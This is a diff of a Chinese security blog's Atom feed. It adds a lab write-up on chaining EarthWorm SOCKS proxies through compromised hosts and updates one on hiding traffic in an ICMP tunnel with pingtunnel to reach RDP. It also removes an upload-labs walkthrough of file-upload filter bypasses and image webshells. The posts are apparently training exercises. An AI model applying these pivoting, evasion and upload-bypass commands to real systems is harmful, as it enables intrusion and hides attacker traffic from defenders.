@@ -6,7 +6,7 @@
   <link href="https://lunamoore.github.io/atom.xml" rel="self"/>
   
   <link href="https://lunamoore.github.io/"/>
-  <updated>2022-01-10T07:56:35.731Z</updated>
+  <updated>2022-01-12T13:21:27.914Z</updated>
   <id>https://lunamoore.github.io/</id>
   
   <author>
@@ -17,11 +17,34 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>ew的使用记录</title>
+    <link href="https://lunamoore.github.io/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
+    <id>https://lunamoore.github.io/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</id>
+    <published>2022-01-12T13:18:43.000Z</published>
+    <updated>2022-01-12T13:21:27.914Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x00-实验拓扑"><a href="#0x00-实验拓扑" class="headerlink" title="0x00.实验拓扑"></a>0x00.实验拓扑</h2><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112203412479.png" class><a id="more"></a><h2 id="0x01-实验一"><a href="#0x01-实验一" class="headerlink" title="0x01.实验一"></a>0x01.实验一</h2><p><strong>当获取到B的权限后，对C进行安全测试</strong></p><p><code>A执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p><code>B执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rssocks -d 114.15.xx.xx -e 8888</span><br></pre></td></tr></table></figure><p><code>代理测试</code></p><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112173653122.png" class><h2 id="0x02-实验二"><a href="#0x02-实验二" class="headerlink" title="0x02.实验二"></a>0x02.实验二</h2><p><strong>当获取到C的权限后对D进行安全测试</strong></p><p><code>A执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_listen -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p><code>C执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure><p><code>B执行，连接A C</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_slave -d 114.15.xx.xx -e 8888 -f 10.10.10.164 -g 9999</span><br></pre></td></tr></table></figure><p><code>代理测试</code></p><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112174844945.png" class><h2 id="0x03-实验三"><a href="#0x03-实验三" class="headerlink" title="0x03.实验三"></a>0x03.实验三</h2><p><strong>当获取到D的权限后对E进行安全测试</strong></p><p><code>A执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 10801 -e 8886</span><br></pre></td></tr></table></figure><p><code>B执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_slave -d 115.14.xx.xx -e 8886 -f 10.10.10.164 -g 6666</span><br></pre></td></tr></table></figure><p><code>C执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_listen -l 6666 -e 7778</span><br></pre></td></tr></table></figure><p><code>D执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rssocks -d 10.10.20.128 -e 7778</span><br></pre></td></tr></table></figure><p><code>代理测试</code></p><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112204533430.png" class>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;0x00-实验拓扑&quot;&gt;&lt;a href=&quot;#0x00-实验拓扑&quot; class=&quot;headerlink&quot; title=&quot;0x00.实验拓扑&quot;&gt;&lt;/a&gt;0x00.实验拓扑&lt;/h2&gt;&lt;img src=&quot;/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112203412479.png&quot; class&gt;</summary>
+    
+    
+    
+    <category term="内网渗透测试,隧道构建" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%9E%84%E5%BB%BA/"/>
+    
+    
+    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
+    
+    <category term="内网安全" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
     <title>ew+pingtunnel构建隧道</title>
     <link href="https://lunamoore.github.io/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/"/>
     <id>https://lunamoore.github.io/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/</id>
     <published>2022-01-10T07:51:34.000Z</published>
-    <updated>2022-01-10T07:56:35.731Z</updated>
+    <updated>2022-01-12T13:19:53.179Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x01-实验拓扑"><a href="#0x01-实验拓扑" class="headerlink" title="0x01.实验拓扑"></a>0x01.实验拓扑</h2><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110145316199.png" class><a id="more"></a><h2 id="0x02-实验目的"><a href="#0x02-实验目的" class="headerlink" title="0x02.实验目的"></a>0x02.实验目的</h2><blockquote><p>假设win 7已经被我们拿下，通过使用ew+pingtunnel构建socks5隧道，隐藏tcp流量，从而达到访问内网server 2021。</p></blockquote><h2 id="0x03-实验过程"><a href="#0x03-实验过程" class="headerlink" title="0x03.实验过程"></a>0x03.实验过程</h2><h3 id="01-kali执行"><a href="#01-kali执行" class="headerlink" title="01.kali执行"></a>01.kali执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -type server -nolog 1 -noprint 1 -key 6666</span><br></pre></td></tr></table></figure><p>kali作为服务端等待连接</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110145902832.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 7777 -e 8888</span><br></pre></td></tr></table></figure><p>将其他机器转发到kali 8888端口的流量转发至kali的7777端口</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110145932313.png" class><h3 id="02-win-7执行"><a href="#02-win-7执行" class="headerlink" title="02.win 7执行"></a>02.win 7执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l :4444 -s 192.168.1.9 -t 192.168.1.9:8888 -key 6666 -nolog 1 -noprint 1 -sock5 -1</span><br></pre></td></tr></table></figure><p>开启socks5，将icmp隧道的流量使用本地4444端口进行转发</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110150533638.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_win.exe -s rssocks -d 127.0.0.1 -e 4444</span><br></pre></td></tr></table></figure><p>win 7使用4444端口进行转发</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152130974.png" class><h3 id="03-测试隧道是否构建成功"><a href="#03-测试隧道是否构建成功" class="headerlink" title="03.测试隧道是否构建成功"></a>03.测试隧道是否构建成功</h3><p><code>查看kali端，出现OK即大概率成功</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152406851.png" class><p><code>使用代理访问server 2021</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152520341.png" class><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152543043.png" class><p><code>使用代理登入3389</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152636239.png" class><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110153711738.png" class><h3 id="04-wireshark抓包查看"><a href="#04-wireshark抓包查看" class="headerlink" title="04.wireshark抓包查看"></a>04.wireshark抓包查看</h3><p><code>可以看到只有icmp协议，证明流量全部封装到icmp隧道中。</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110154031923.png" class><h3 id="05-icmp隧道的防范"><a href="#05-icmp隧道的防范" class="headerlink" title="05.icmp隧道的防范"></a>05.icmp隧道的防范</h3><p>一个正常的ping命令每秒最多发送两个数据包，而使用icmp隧道则再很短时间内产生上千个数据包。</p>]]></content>
     
@@ -30,7 +53,7 @@
     
     
     
-    <category term="内网渗透测试" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    <category term="内网渗透测试,隧道构建" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%9E%84%E5%BB%BA/"/>
     
     
     <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
@@ -503,28 +526,6 @@
     <category term="调教" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
     
     <category term="Shiro" scheme="https://lunamoore.github.io/tags/Shiro/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>upload_labs</title>
-    <link href="https://lunamoore.github.io/2021/05/03/upload-labs/"/>
-    <id>https://lunamoore.github.io/2021/05/03/upload-labs/</id>
-    <published>2021-05-03T11:21:45.000Z</published>
-    <updated>2021-05-03T11:40:24.986Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Pass01-基于前端js验证"><a href="#Pass01-基于前端js验证" class="headerlink" title="Pass01.基于前端js验证"></a>Pass01.基于前端js验证</h2><p><code>上传图片抓包改后缀</code></p><h2 id="Pass02-检测MIME类型"><a href="#Pass02-检测MIME类型" class="headerlink" title="Pass02.检测MIME类型"></a>Pass02.检测MIME类型</h2><p><code>修改MIME为image/jpeg</code></p><a id="more"></a><h2 id="Pass03-黑名单-文件后缀绕过"><a href="#Pass03-黑名单-文件后缀绕过" class="headerlink" title="Pass03.黑名单 文件后缀绕过"></a>Pass03.黑名单 文件后缀绕过</h2><p><code>首先修改apache2配置文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apache2/mods-available/mime.conf</span><br><span class="line">找到AddType application，增加一行，重启服务</span><br><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht .php3</span><br></pre></td></tr></table></figure><p><code>上传.php5文件</code></p><img src="/2021/05/03/upload-labs/image-20210501125955299.png" class><h2 id="Pass04-黑名单-htaccess绕过"><a href="#Pass04-黑名单-htaccess绕过" class="headerlink" title="Pass04.黑名单 .htaccess绕过"></a>Pass04.黑名单 .htaccess绕过</h2><p><code>先上传.htaccess文件，内容如下</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">此条伪静态规则为将demo文件解析成php文件执行</span><br><span class="line">&lt;FilesMatch &quot;demo&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">也可以是以下，将所有文件解析为php</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><code>本次使用第二条，将所有文件解析为php</code></p><img src="/2021/05/03/upload-labs/image-20210501130707455.png" class><h2 id="Pass05-黑名单-大小写绕过"><a href="#Pass05-黑名单-大小写绕过" class="headerlink" title="Pass05.黑名单 大小写绕过"></a>Pass05.黑名单 大小写绕过</h2><p><code>禁止上传.htaccess</code></p><img src="/2021/05/03/upload-labs/image-20210501131324884.png" class><h2 id="Pass06-黑名单-空格绕过"><a href="#Pass06-黑名单-空格绕过" class="headerlink" title="Pass06.黑名单 空格绕过"></a>Pass06.黑名单 空格绕过</h2><p><code>禁止上传.htaccess</code></p><p><code>在文件后加一个空格即可(需要在windows环境下，widows自动去空格和点)</code></p><h2 id="Pass07-黑名单-点绕过"><a href="#Pass07-黑名单-点绕过" class="headerlink" title="Pass07.黑名单 点绕过"></a>Pass07.黑名单 点绕过</h2><p><code>禁止上传.htaccess</code></p><p><code>在文件后加一个点即可(最好在windows环境下)</code></p><img src="/2021/05/03/upload-labs/image-20210501134215848.png" class><h2 id="Pass08-黑名单-DATA绕过"><a href="#Pass08-黑名单-DATA绕过" class="headerlink" title="Pass08.黑名单 ::$DATA绕过"></a>Pass08.黑名单 ::$DATA绕过</h2><p><code>文件后缀添加::$DATA绕过(windows环境)</code></p><h2 id="Pass09-黑名单-点空点绕过"><a href="#Pass09-黑名单-点空点绕过" class="headerlink" title="Pass09.黑名单 点空点绕过"></a>Pass09.黑名单 点空点绕过</h2><p><code>会删除文件后的点，在文件后添加. .进行绕过(window环境)</code></p><h2 id="Pass10-黑名单-双写后缀绕过"><a href="#Pass10-黑名单-双写后缀绕过" class="headerlink" title="Pass10.黑名单 双写后缀绕过"></a>Pass10.黑名单 双写后缀绕过</h2><p><code>从前匹配php进行删除，双写绕过</code></p><h2 id="Pass11-白名单-00绕过"><a href="#Pass11-白名单-00绕过" class="headerlink" title="Pass11.白名单 %00绕过"></a>Pass11.白名单 %00绕过</h2><p><code>get传参路径可控</code></p><img src="/2021/05/03/upload-labs/image-20210501173709601.png" class><p><code>PHP版本小于5.3.4 关闭GPC</code></p><img src="/2021/05/03/upload-labs/image-20210501180802917.png" class><h2 id="Pass12-白名单-0x00绕过"><a href="#Pass12-白名单-0x00绕过" class="headerlink" title="Pass12.白名单 0x00绕过"></a>Pass12.白名单 0x00绕过</h2><blockquote><p>shell_get.php%00</p></blockquote><p><code>同上，由于post传参所以将%00进行url编码</code></p><img src="/2021/05/03/upload-labs/image-20210501182130172.png" class><h2 id="Pass13-检查图标内容开头2个字节-图片马绕过"><a href="#Pass13-检查图标内容开头2个字节-图片马绕过" class="headerlink" title="Pass13.检查图标内容开头2个字节 图片马绕过"></a>Pass13.检查图标内容开头2个字节 图片马绕过</h2><img src="/2021/05/03/upload-labs/image-20210501184645711.png" class><h2 id="Pass14-getimagesize-检查是否为图片文件-图片马绕过"><a href="#Pass14-getimagesize-检查是否为图片文件-图片马绕过" class="headerlink" title="Pass14.getimagesize()检查是否为图片文件 图片马绕过"></a>Pass14.getimagesize()检查是否为图片文件 图片马绕过</h2><p><code>同上</code></p><h2 id="Pass15-exif-imagetype-检查是否为图片文件-图片马绕过"><a href="#Pass15-exif-imagetype-检查是否为图片文件-图片马绕过" class="headerlink" title="Pass15.exif_imagetype()检查是否为图片文件 图片马绕过"></a>Pass15.exif_imagetype()检查是否为图片文件 图片马绕过</h2><p><code>同上</code></p><h2 id="Pass16-图片二次渲染"><a href="#Pass16-图片二次渲染" class="headerlink" title="Pass16.图片二次渲染"></a>Pass16.图片二次渲染</h2><p><code>将二次渲染后文件未变化的部分添加一句话，再次上传，再包含，蚁剑连接。本案例使用gif，图片不知道为什么上传不上去。</code> </p><img src="/2021/05/03/upload-labs/image-20210503180938026.png" class><h2 id="Pass17-条件竞争"><a href="#Pass17-条件竞争" class="headerlink" title="Pass17.条件竞争"></a>Pass17.条件竞争</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnVqaWVhY2UuY29tL3BlbmV0cmF0aW9uLXRlc3QvdXBsb2FkLWxhYnMtcGFzcy0xNy5odG1s">大佬的文章<i class="fa fa-external-link-alt"></i></span></p><p><code>先move再判断，符合白名单就重命名，不符合就unlink。</code></p><p><code>但是我图片马直接就可以了，为了学习新知识，也用大佬的方法做了一遍</code></p><h2 id="Pass18-条件竞争"><a href="#Pass18-条件竞争" class="headerlink" title="Pass18.条件竞争"></a>Pass18.条件竞争</h2><p><code>与pass17类似</code></p><h2 id="Pass19-绕过"><a href="#Pass19-绕过" class="headerlink" title="Pass19./.绕过"></a>Pass19./.绕过</h2><p><code>move_uploaded_file会忽略掉文件末尾的 /.</code></p><img src="/2021/05/03/upload-labs/image-20210503190859889.png" class><img src="/2021/05/03/upload-labs/image-20210503191007583.png" class><h2 id="Pass20-代码审计-数组绕过"><a href="#Pass20-代码审计-数组绕过" class="headerlink" title="Pass20.代码审计 数组绕过"></a>Pass20.代码审计 数组绕过</h2><p><code>直接参考大佬的文章</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTQwMjk3OTUvYXJ0aWNsZS9kZXRhaWxzLzEwMjkxNzE5OQ==">地址<i class="fa fa-external-link-alt"></i></span></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;Pass01-基于前端js验证&quot;&gt;&lt;a href=&quot;#Pass01-基于前端js验证&quot; class=&quot;headerlink&quot; title=&quot;Pass01.基于前端js验证&quot;&gt;&lt;/a&gt;Pass01.基于前端js验证&lt;/h2&gt;&lt;p&gt;&lt;code&gt;上传图片抓包改后缀&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&quot;Pass02-检测MIME类型&quot;&gt;&lt;a href=&quot;#Pass02-检测MIME类型&quot; class=&quot;headerlink&quot; title=&quot;Pass02.检测MIME类型&quot;&gt;&lt;/a&gt;Pass02.检测MIME类型&lt;/h2&gt;&lt;p&gt;&lt;code&gt;修改MIME为image/jpeg&lt;/code&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="Web靶场" scheme="https://lunamoore.github.io/categories/Web%E9%9D%B6%E5%9C%BA/"/>
-    
-    
-    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
     
   </entry>
   
